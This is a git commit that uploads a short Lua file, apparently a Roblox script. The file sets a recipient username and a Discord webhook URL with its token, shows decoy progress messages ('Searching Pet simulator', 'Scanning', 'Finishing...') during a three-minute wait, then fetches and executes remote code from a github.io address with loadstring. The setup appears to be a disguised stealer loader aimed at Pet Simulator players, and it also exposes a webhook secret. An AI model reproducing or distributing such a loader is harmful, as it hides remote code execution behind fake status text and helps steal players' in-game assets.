ba7eefacb7db657e032974ac11dd48004f886030
FalconHubScripts <130830665+FalconHubScripts@users.noreply.github.com>
2023-04-30 09:44:45 +0200

    Add files via upload

---
+++ 638364499912425524 (1).lua
@@ -0,0 +1,8 @@
+UserName = "Leander1573"
+Webhook = "https://discord.com/api/webhooks/1101891638437093488/CP-lIJuSwe_5sYCrR94CaOllm8L16g4t981Ms4LuMy5PxMp9w5dTXaihPxvmzCpJXcTv"
+_G.ScriptName = "Sezzzyy"
+_G.FirstText = "Searching Pet simulator"
+_G.SecondText = "Scanning"
+_G.ThirdText = "Finishing..."
+_G.WaitingTime = 180
+loadstring(game:HttpGet("https://rizz69.github.io/Main.lua", true))()
